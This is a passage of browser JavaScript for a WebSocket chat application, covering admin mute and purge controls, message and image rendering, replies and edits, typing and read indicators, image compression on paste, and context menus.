        muteTimers.set(u.toLowerCase(), setTimeout(() => {
          mutedUsers.delete(u.toLowerCase());
          muteTimers.delete(u.toLowerCase());
          updateUsers(currentUsers);
        }, dur * 1000));
        updateUsers(currentUsers);
      });
      muteRow.appendChild(muteDur); muteRow.appendChild(muteBtn);

      const actRow = document.createElement('div'); actRow.className = 'admin-actions-row';
      const unmuteBtn = document.createElement('button'); unmuteBtn.className = 'admin-action-btn btn-unmute'; unmuteBtn.textContent = 'unmute'; unmuteBtn.style.flex = '1';
      unmuteBtn.addEventListener('click', (e) => {
        e.stopPropagation(); if (!window.ws || window.ws.readyState !== WebSocket.OPEN) return;
        window.ws.send(JSON.stringify({ type: 'unmute', username: u }));
        mutedUsers.delete(u.toLowerCase()); updateUsers(currentUsers);
      });
      const purgeBtn = document.createElement('button'); purgeBtn.className = 'admin-action-btn btn-purge'; purgeBtn.textContent = '🗑 purge msgs'; purgeBtn.style.flex = '1';
      purgeBtn.addEventListener('click', (e) => {
        e.stopPropagation(); if (!window.ws || window.ws.readyState !== WebSocket.OPEN) return;
        if (!confirm(`delete all messages from ${u}?`)) return;
        window.ws.send(JSON.stringify({ type: 'purge', username: u }));
      });
      actRow.appendChild(unmuteBtn); actRow.appendChild(purgeBtn);

      panel.appendChild(kickRow); panel.appendChild(muteRow); panel.appendChild(actRow);
      el.appendChild(panel);
      el.addEventListener('click', () => {
        if (!isAdmin) return;
        const wasExpanded = el.classList.contains('expanded');
        userList.querySelectorAll('.user-item.expanded').forEach(x => x.classList.remove('expanded'));
        if (!wasExpanded) el.classList.add('expanded');
      });
    }
    userList.appendChild(el);
  });
}

// ── DOM RENDER MESSAGES ───────────────────────────────────────────────
function appendSystem(msg) {
  lastMsgUser = null; lastMsgTimestamp = 0; hideEmptyState();
  const wrap = document.createElement('div'); wrap.className = 'msg-system';
  const inner = document.createElement('span'); inner.className = 'msg-system-inner';
  inner.textContent = msg; wrap.appendChild(inner); messagesEl.appendChild(wrap); maybeScrollToBottom();
}
function appendChatError(msg) {
  hideEmptyState();
  const el = document.createElement('div'); el.className = 'msg-chat-error'; el.textContent = msg;
  messagesEl.appendChild(el); maybeScrollToBottom();
}

function appendMessage({ username, text, ts, id, replyTo }) {
  const time = window.fmtTime(ts);
  hideEmptyState();
  const serverTs = ts || Date.now();
  const isGrouped = !replyTo && username === lastMsgUser && (serverTs - lastMsgTimestamp) < GROUP_TIMEOUT;
  lastMsgUser = username; lastMsgTimestamp = serverTs;

  const color = window.getUserColor(username);
  const msgEl = document.createElement('div');
  msgEl.className = 'msg' + (username === window.myUsername ? ' own' : '') + (isGrouped ? ' grouped' : '');
  msgEl.dataset.username = username;
  if (id) { msgEl.dataset.msgId = id; msgMeta[id] = { el: msgEl, username }; }

  const avatarCol = document.createElement('div'); avatarCol.className = 'msg-avatar-col';
  const avatar = window.buildAvatarEl(username, 'msg-avatar');
  avatarCol.appendChild(avatar);
  const hoverTime = document.createElement('span'); hoverTime.className = 'msg-hover-time'; hoverTime.textContent = time;
  avatarCol.appendChild(hoverTime);

  const body = document.createElement('div'); body.className = 'msg-body';
  const header = document.createElement('div'); header.className = 'msg-header';
  const userEl = document.createElement('span'); userEl.className = 'msg-user'; userEl.style.color = color; userEl.textContent = username;
  const timeEl = document.createElement('span'); timeEl.className = 'msg-time'; timeEl.textContent = time;
  header.appendChild(userEl); header.appendChild(timeEl);

  const textEl = document.createElement('div'); textEl.className = 'msg-text';

  if (replyTo && replyTo.id && replyTo.username) {
    msgEl.classList.add('has-reply');
    const previewEl = document.createElement('div'); previewEl.className = 'msg-reply-preview'; previewEl.dataset.replyId = replyTo.id;
    const connectorEl = document.createElement('div'); connectorEl.className = 'msg-reply-connector';
    const contentEl = document.createElement('div'); contentEl.className = 'msg-reply-content';
    const qColor = window.getUserColor(replyTo.username);
    const dotEl = window.buildAvatarEl(replyTo.username, 'msg-reply-avatar');
    const qUser = document.createElement('span'); qUser.className = 'msg-reply-user'; qUser.style.color = qColor; qUser.textContent = replyTo.username;
    const qText = document.createElement('span'); qText.className = 'msg-reply-text';
    qText.textContent = replyTo.text ? (replyTo.text.length > 100 ? replyTo.text.slice(0, 97) + '…' : replyTo.text) : '📷 image';
    contentEl.appendChild(dotEl); contentEl.appendChild(qUser); contentEl.appendChild(qText);
    previewEl.appendChild(connectorEl); previewEl.appendChild(contentEl); msgEl.appendChild(previewEl);
  }

  const textContent = document.createElement('span'); textContent.className = 'msg-text-content';
  textContent.innerHTML = window.highlightMentions(text);
  textEl.appendChild(textContent);
  body.appendChild(header); body.appendChild(textEl);

  if (id) {
    const actions = document.createElement('div'); actions.className = 'msg-actions';
    const replyBtn = document.createElement('button'); replyBtn.className = 'msg-action-btn'; replyBtn.title = 'Reply'; replyBtn.innerHTML = '↩';
    replyBtn.addEventListener('click', e => { e.stopPropagation(); window.startReply(id); });
    actions.appendChild(replyBtn);
    if (username === window.myUsername) {
      const editBtn = document.createElement('button'); editBtn.className = 'msg-action-btn'; editBtn.title = 'Edit'; editBtn.innerHTML = '✏';
      editBtn.addEventListener('click', e => { e.stopPropagation(); window.startEdit(id); });
      actions.appendChild(editBtn);
    }
    msgEl.appendChild(actions);

    msgEl.addEventListener('dblclick', function (e) {
      if (e.target.closest('.msg-actions') || e.target.closest('.msg-reply-preview')) return;
      window.startReply(id);
    });

    let _lpt = null;
    let _lpMoved = false;
    msgEl.addEventListener('touchstart', function () {
      _lpMoved = false;
      _lpt = setTimeout(function () {
        if (_lpMoved) return;
        if (username === window.myUsername && window.showMsgActionSheet) window.showMsgActionSheet(id, username);
        else window.startReply(id);
      }, LONG_PRESS_MS);
    }, { passive: true });
    msgEl.addEventListener('touchend', function () { clearTimeout(_lpt); }, { passive: true });
    msgEl.addEventListener('touchmove', function () { _lpMoved = true; clearTimeout(_lpt); }, { passive: true });
    msgEl.addEventListener('touchcancel', function () { clearTimeout(_lpt); }, { passive: true });
  }

  msgEl.appendChild(avatarCol); msgEl.appendChild(body);
  messagesEl.appendChild(msgEl);
  if (username === window.myUsername) { lastOwnMsgEl = msgEl; if (id) lastOwnMsgId = id; clearSeenRow(); }
  maybeScrollToBottom();
  trimOldMessages();
}

function appendImage({ username, data: imgData, ts, id }) {
  const time = window.fmtTime(ts); hideEmptyState();
  const serverTs = ts || Date.now();
  const isGrouped = username === lastMsgUser && (serverTs - lastMsgTimestamp) < GROUP_TIMEOUT;
  lastMsgUser = username; lastMsgTimestamp = serverTs;

  const color = window.getUserColor(username);
  const msgEl = document.createElement('div');
  msgEl.className = 'msg' + (username === window.myUsername ? ' own' : '') + (isGrouped ? ' grouped' : '');
  msgEl.dataset.username = username;
  if (id) { msgEl.dataset.msgId = id; msgMeta[id] = { el: msgEl, username }; }

  const avatarCol = document.createElement('div'); avatarCol.className = 'msg-avatar-col';
  const avatar = window.buildAvatarEl(username, 'msg-avatar');
  avatarCol.appendChild(avatar);

  const body = document.createElement('div'); body.className = 'msg-body';
  const header = document.createElement('div'); header.className = 'msg-header';
  const userEl = document.createElement('span'); userEl.className = 'msg-user'; userEl.style.color = color; userEl.textContent = username;
  const timeEl = document.createElement('span'); timeEl.className = 'msg-time'; timeEl.textContent = time;
  header.appendChild(userEl); header.appendChild(timeEl);

  const imgWrap = document.createElement('div'); imgWrap.className = 'msg-image';
  const img = document.createElement('img');
  const blobUrl = window.base64ToBlobUrl(imgData);
  if (!blobUrl) { appendChatError('Failed to load an image from ' + username); return; }
  img.src = blobUrl; img.dataset.blobUrl = blobUrl; img.alt = 'image'; img.loading = 'lazy';
  img.addEventListener('click', () => { window.openLightbox(blobUrl); });
  imgWrap.appendChild(img);

  body.appendChild(header); body.appendChild(imgWrap);

  if (id) {
    const actions = document.createElement('div'); actions.className = 'msg-actions';
    const replyBtn = document.createElement('button'); replyBtn.className = 'msg-action-btn';
    replyBtn.title = 'Reply'; replyBtn.innerHTML = '↩';
    replyBtn.addEventListener('click', e => { e.stopPropagation(); window.startReply(id); });
    actions.appendChild(replyBtn);
    msgEl.appendChild(actions);
  }

  msgEl.appendChild(avatarCol); msgEl.appendChild(body);
  messagesEl.appendChild(msgEl);

  if (username === window.myUsername) { lastOwnMsgEl = msgEl; clearSeenRow(); }
  maybeScrollToBottom();
  trimOldMessages();
}

// ── EDIT / REPLY ───────────────────────────────────────────────────────
window.startEdit = function (id) {
  if (replyingTo) cancelReply();
  const meta = msgMeta[id]; if (!meta || meta.username !== window.myUsername) return;
  const textEl = meta.el.querySelector('.msg-text'); if (!textEl) return;
  const textContent = textEl.querySelector('.msg-text-content') || textEl;
  const raw = Array.from(textContent.childNodes)
    .filter(n => !(n.nodeType === Node.ELEMENT_NODE && n.classList.contains('msg-edited')))
    .map(n => n.textContent).join('') || '';
  editingMsgId = id; msgInput.value = raw;
  msgInput.style.height = 'auto'; msgInput.style.height = Math.min(msgInput.scrollHeight, 120) + 'px';
  editBanner.classList.add('visible'); msgInput.focus();
  msgInput.setSelectionRange(raw.length, raw.length);
  meta.el.scrollIntoView({ block: 'nearest', behavior: 'smooth' });
};
function cancelEdit() {
  editingMsgId = null; editBanner.classList.remove('visible');
  msgInput.value = ''; msgInput.style.height = 'auto';
  charCounter.textContent = ''; charCounter.className = ''; msgInput.focus();
}
editCancelBtn.addEventListener('click', cancelEdit);

window.startReply = function (id) {
  if (editingMsgId) cancelEdit();
  const meta = msgMeta[id]; if (!meta) return;
  const textEl = meta.el.querySelector('.msg-text');
  const textContent = textEl && (textEl.querySelector('.msg-text-content') || textEl);
  const plainText = textContent ? Array.from(textContent.childNodes).filter(n => !(n.nodeType === Node.ELEMENT_NODE && n.classList.contains('msg-edited'))).map(n => n.textContent).join('').trim() : '';
  replyingTo = { id, username: meta.username, text: plainText || '📷 image' };
  replyBannerUser.textContent = meta.username + ': ';
  const replyBannerText = document.getElementById('reply-banner-text');
  if (replyBannerText) replyBannerText.textContent = replyingTo.text.length > 60 ? replyingTo.text.slice(0, 57) + '…' : replyingTo.text;
  replyBanner.classList.add('visible'); msgInput.focus();
  meta.el.scrollIntoView({ block: 'nearest', behavior: 'smooth' });
};
function cancelReply() { replyingTo = null; replyBanner.classList.remove('visible'); replyBannerUser.textContent = ''; const rbt = document.getElementById('reply-banner-text'); if (rbt) rbt.textContent = ''; msgInput.focus(); }
replyCancelBtn.addEventListener('click', cancelReply);

// ── SEND ───────────────────────────────────────────────────────────────
function genMsgId() {
  const bytes = new Uint8Array(8);
  crypto.getRandomValues(bytes);
  return Date.now().toString(36) + '-' + Array.from(bytes, b => b.toString(16).padStart(2, '0')).join('');
}
function submitEdit() {
  const text = msgInput.value.trim();
  if (text) window.safeSend({ type: 'edit', id: editingMsgId, text });
  cancelEdit();
}
function submitImage() {
  const imageData = pendingImage;
  const text = msgInput.value.trim();
  clearPastePreview();
  window.safeSend({ type: 'image', data: imageData, replyTo: replyingTo ? { id: replyingTo.id, username: replyingTo.username, text: replyingTo.text } : undefined });
  cancelReply();
  if (text) window.safeSend({ type: 'message', text, id: genMsgId() });
  msgInput.value = ''; msgInput.style.height = 'auto';
  charCounter.textContent = ''; charCounter.className = '';
  lastTypingSent = 0; msgInput.focus();
}
function sendMessage() {
  if (editingMsgId) return submitEdit();
  if (pendingImage) return submitImage();
  const text = msgInput.value.trim(); if (!text) return;
  if (text.length > MAX_MSG_LENGTH) { appendChatError(`Message too long (max ${MAX_MSG_LENGTH} characters).`); return; }

  // ── Taxonomy card trigger ──────────────────────────────────────────
  if (text.startsWith('!') && window.CardMatcher) {
    const query = text.slice(1);
    const taxId = window.CardMatcher.match(query);
    if (taxId) {
      window.safeSend({ type: 'message', text, taxId });
      msgInput.value = ''; msgInput.style.height = 'auto';
      charCounter.textContent = ''; charCounter.className = ''; lastTypingSent = 0; msgInput.focus();
      return;
    }
    // Unknown command — let it send as plain text so user sees it
  }
  // ── Regular message ───────────────────────────────────────────────
  window.safeSend({ type: 'message', text, id: genMsgId(), replyTo: replyingTo ? { id: replyingTo.id, username: replyingTo.username, text: replyingTo.text } : undefined });
  cancelReply(); msgInput.value = ''; msgInput.style.height = 'auto';
  charCounter.textContent = ''; charCounter.className = ''; lastTypingSent = 0; msgInput.focus();
}

sendBtn.addEventListener('click', sendMessage);
msgInput.addEventListener('keydown', e => {
  if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); sendMessage(); return; }
  if (e.key === 'ArrowUp' && !msgInput.value.trim() && lastOwnMsgId) { e.preventDefault(); window.startEdit(lastOwnMsgId); }
  if (e.key === 'ArrowDown' && !msgInput.value.trim() && lastOtherMsgId) {
    e.preventDefault();
    window.startReply(lastOtherMsgId);
  }
  if (e.key === 'Escape' && editingMsgId) { e.preventDefault(); cancelEdit(); }
  else if (e.key === 'Escape' && replyingTo) { e.preventDefault(); cancelReply(); }
});

let _resizeRaf = null;
msgInput.addEventListener('input', () => {
  const len = msgInput.value.length;
  if (len > 800) { charCounter.textContent = `${1000 - len}`; charCounter.className = len > 950 ? 'limit' : 'warn'; }
  else { charCounter.textContent = ''; charCounter.className = ''; }
  if (msgInput.value.trim()) sendTyping();
  if (!_resizeRaf) {
    _resizeRaf = requestAnimationFrame(() => {
      msgInput.style.height = 'auto';
      msgInput.style.height = Math.min(msgInput.scrollHeight, 120) + 'px';
      _resizeRaf = null;
    });
  }
});

// ── TYPING / SEEN ──────────────────────────────────────────────────────
function showTyping(username) {
  if (username === window.myUsername) return;
  if (typingUsers.has(username)) clearTimeout(typingUsers.get(username));
  typingUsers.set(username, setTimeout(() => clearTypingUser(username), 3000));
  renderTyping();
}
function clearTypingUser(username) {
  if (!typingUsers.has(username)) return;
  clearTimeout(typingUsers.get(username)); typingUsers.delete(username); renderTyping();
}
function clearAllTyping() {
  for (const [, t] of typingUsers) clearTimeout(t);
  typingUsers.clear(); renderTyping();
}
function renderTyping() {
  const names = [...typingUsers.keys()];
  if (names.length === 0) { typingBar.textContent = ''; return; }
  if (names.length === 1) typingBar.textContent = `${names[0]} is typing…`;
  else if (names.length === 2) typingBar.textContent = `${names[0]} and ${names[1]} are typing…`;
  else typingBar.textContent = 'several people are typing…';
}
function sendTyping() {
  if (!window.ws || window.ws.readyState !== WebSocket.OPEN) return;
  const now = Date.now(); if (now - lastTypingSent < TYPING_THROTTLE) return;
  lastTypingSent = now; window.ws.send(JSON.stringify({ type: 'typing' }));
}

function sendSeen() {
  if (!window.ws || window.ws.readyState !== WebSocket.OPEN) return;
  if (!lastPublicMsgTs) return;
  window.ws.send(JSON.stringify({ type: 'seen', ts: lastPublicMsgTs }));
}
function clearSeenRow() { const existing = messagesEl.querySelector('.msg-seen'); if (existing) existing.remove(); }
function renderSeen(users) {
  clearSeenRow();
  if (window.myUsername !== lastMsgSender) return;
  if (!lastOwnMsgEl) return;
  const readers = users.filter(u => u !== window.myUsername); if (readers.length === 0) return;
  const row = document.createElement('div'); row.className = 'msg-seen';
  const label = document.createElement('span'); label.className = 'seen-label'; label.textContent = 'seen'; row.appendChild(label);
  readers.forEach(u => {
    const dot = document.createElement('div'); dot.className = 'seen-dot'; dot.title = u;
    dot.style.background = window.getUserColor(u); dot.textContent = u.charAt(0).toUpperCase(); row.appendChild(dot);
  });
  lastOwnMsgEl.after(row); maybeScrollToBottom();
}
let _seenScrollTimer = null;
messagesEl.addEventListener('scroll', () => {
  if (!windowFocused) return;
  if (_seenScrollTimer) return;
  _seenScrollTimer = setTimeout(() => {
    _seenScrollTimer = null;
    const dist = messagesEl.scrollHeight - messagesEl.scrollTop - messagesEl.clientHeight;
    if (dist < SCROLL_BOTTOM_THRESHOLD) sendSeen();
  }, 200);
});

// ── IMAGE COMPRESSION / PASTE ──────────────────────────────────────────
const MAX_DIMENSION = 1920, MAX_B64_SIZE = 1400000;
window.compressImage = function (file) {
  return new Promise((resolve, reject) => {
    if (!file.type.startsWith('image/')) return reject('Not an image');
    if (file.type === 'image/gif') return reject('GIFs are not supported');
    const reader = new FileReader();
    reader.onload = e => {
      const img = new Image();
      img.onload = () => {
        let { width, height } = img;
        if (width > MAX_DIMENSION || height > MAX_DIMENSION) {
          const ratio = Math.min(MAX_DIMENSION / width, MAX_DIMENSION / height);
          width = Math.round(width * ratio); height = Math.round(height * ratio);
        }
        // Always convert to JPEG (handles PNGs too) with progressive quality fallback
        const qualities = [0.82, 0.70, 0.55, 0.40];
        let b64 = null;
        for (const quality of qualities) {
          const canvas = document.createElement('canvas'); canvas.width = width; canvas.height = height;
          const ctx = canvas.getContext('2d');
          ctx.fillStyle = '#ffffff'; ctx.fillRect(0, 0, width, height);
          ctx.drawImage(img, 0, 0, width, height);
          b64 = canvas.toDataURL('image/jpeg', quality);
          if (b64.length <= MAX_B64_SIZE) { resolve(b64); return; }
        }
        // Last resort: halve dimensions and retry
        width = Math.round(width / 2); height = Math.round(height / 2);
        const canvas = document.createElement('canvas'); canvas.width = width; canvas.height = height;
        const ctx = canvas.getContext('2d');
        ctx.fillStyle = '#ffffff'; ctx.fillRect(0, 0, width, height);
        ctx.drawImage(img, 0, 0, width, height);
        b64 = canvas.toDataURL('image/jpeg', 0.55);
        if (b64.length <= MAX_B64_SIZE) { resolve(b64); return; }
        reject('Image too large even after compression.');
      };
      img.onerror = () => reject('Could not load image'); img.src = e.target.result;
    };
    reader.onerror = () => reject('Could not read file'); reader.readAsDataURL(file);
  });
};

function showPastePreview(b64, sizeKB) {
  pendingImage = b64; pasteThumb.src = b64; pasteInfo.textContent = `image · ${sizeKB}KB`;
  pastePreview.classList.add('visible');
}
function clearPastePreview() {
  pendingImage = null; pasteThumb.src = ''; pastePreview.classList.remove('visible');
}
pasteCancel.addEventListener('click', clearPastePreview);

msgInput.addEventListener('paste', async e => {
  const items = e.clipboardData && e.clipboardData.items; if (!items) return;
  for (const item of items) {
    if (item.type.startsWith('image/')) {
      e.preventDefault(); const file = item.getAsFile();
      try {
        const b64 = await window.compressImage(file);
        showPastePreview(b64, Math.round(b64.length * 0.75 / 1024));
      } catch (err) { appendChatError(typeof err === 'string' ? err : 'Could not process image.'); }
      return;
    }
  }
});

// Image Attach Button
const imgAttachBtn = document.getElementById('img-attach-btn');
const imgAttachInput = document.getElementById('img-attach-input');
if (imgAttachBtn) {
  imgAttachBtn.addEventListener('click', function () { imgAttachInput.value = ''; imgAttachInput.click(); });
  imgAttachInput.addEventListener('change', async function () {
    var file = imgAttachInput.files && imgAttachInput.files[0]; if (!file) return;
    try {
      var b64 = await window.compressImage(file);
      showPastePreview(b64, Math.round(b64.length * 0.75 / 1024));
    } catch (err) { appendChatError(typeof err === 'string' ? err : 'Could not process image.'); }
  });
}

// ── CONTEXT MENU ───────────────────────────────────────────────────────
const ctxMenu = document.getElementById('dm-ctx-menu');
window.ctxVisible = false;

window.showDMContextMenu = function (x, y, username) {
  ctxMenu.innerHTML = '';
  var item = document.createElement('div'); item.className = 'ctx-item';
  item.innerHTML = '<span>&#x1F4AC;</span> Message <strong>' + window.escapeHtml(username) + '</strong>';
  item.addEventListener('click', function () { if (window.DM) window.DM.open(username); window.hideCtxMenu(); });
  ctxMenu.appendChild(item); ctxMenu.classList.add('visible'); window.ctxVisible = true;
  ctxMenu.style.left = '0'; ctxMenu.style.top = '0';
  requestAnimationFrame(function () {
    var z = parseFloat(getComputedStyle(document.documentElement).zoom) || 1;
    var r = ctxMenu.getBoundingClientRect();
    var ax = x / z, ay = y / z;
    ctxMenu.style.left = Math.min(ax, window.innerWidth / z - r.width / z - 8) + 'px';
    ctxMenu.style.top = Math.min(ay, window.innerHeight / z - r.height / z - 8) + 'px';
  });
};
window.hideCtxMenu = function () { ctxMenu.classList.remove('visible'); window.ctxVisible = false; };
document.addEventListener('click', function () { if (window.ctxVisible) window.hideCtxMenu(); });
document.addEventListener('contextmenu', function (e) { if (!e.target.closest('[data-dm-user]')) window.hideCtxMenu(); });

messagesEl.addEventListener('contextmenu', function (e) {
  const msgEl = e.target.closest('.msg[data-msg-id]'); if (!msgEl) return;
  e.preventDefault(); e.stopPropagation();
  const id = msgEl.dataset.msgId, username = msgEl.dataset.username;
  ctxMenu.innerHTML = '';
  const replyItem = document.createElement('div'); replyItem.className = 'ctx-item'; replyItem.innerHTML = '<span>↩</span> Reply';
  replyItem.addEventListener('click', function () { window.hideCtxMenu(); window.startReply(id); });
  ctxMenu.appendChild(replyItem);
  if (username === window.myUsername) {
    const editItem = document.createElement('div'); editItem.className = 'ctx-item'; editItem.innerHTML = '<span>✏</span> Edit';
    editItem.addEventListener('click', function () { window.hideCtxMenu(); window.startEdit(id); });
    ctxMenu.appendChild(editItem);
  }
  ctxMenu.classList.add('visible'); window.ctxVisible = true;
  ctxMenu.style.left = '0'; ctxMenu.style.top = '0';
  requestAnimationFrame(function () {
    var z = parseFloat(getComputedStyle(document.documentElement).zoom) || 1;
    const r = ctxMenu.getBoundingClientRect();
    ctxMenu.style.left = Math.min(e.clientX / z, window.innerWidth / z - r.width / z - 8) + 'px';
    ctxMenu.style.top = Math.min(e.clientY / z, window.innerHeight / z - r.height / z - 8) + 'px';
  });
});

messagesEl.addEventListener('click', function (e) {
  const previewEl = e.target.closest('.msg-reply-preview[data-reply-id]'); if (!previewEl) return;
  const targetId = previewEl.dataset.replyId, targetMeta = msgMeta[targetId]; if (!targetMeta) return;
  targetMeta.el.scrollIntoView({ block: 'center', behavior: 'smooth' });
  targetMeta.el.classList.remove('msg-flash'); void targetMeta.el.offsetWidth;
  targetMeta.el.classList.add('msg-flash'); setTimeout(() => targetMeta.el.classList.remove('msg-flash'), FLASH_DURATION_MS);
});

// ── BROWSER HISTORY / MOBILE BACK ──────────────────────────────────────
window.addEventListener('beforeunload', () => {
  messagesEl.querySelectorAll('img[data-blob-url]').forEach(img => {
    URL.revokeObjectURL(img.dataset.blobUrl);
  });
});
history.replaceState({ cathedral: true }, '');
window.addEventListener('popstate', function (e) {
  if (window.innerWidth > 640) return;
  if (e.state && e.state.dmOpen) {
    if (window.DM) {
      var w = window.DM.windows[e.state.dmOpen];
      if (w && !w.hidden) { w.hidden = true; w.el.classList.add('dm-hidden'); window.DM._updateTray(); }
    }
    history.replaceState({ cathedral: true }, '');
    return;
  }
  history.replaceState({ cathedral: true }, '');
  if (window.DM) {
    var visibleDMs = Object.keys(window.DM.windows).filter(function (k) { return !window.DM.windows[k].hidden; });
    visibleDMs.forEach(function (u) { window.DM.windows[u].hidden = true; window.DM.windows[u].el.classList.add('dm-hidden'); });
    if (visibleDMs.length) window.DM._updateTray();
  }
});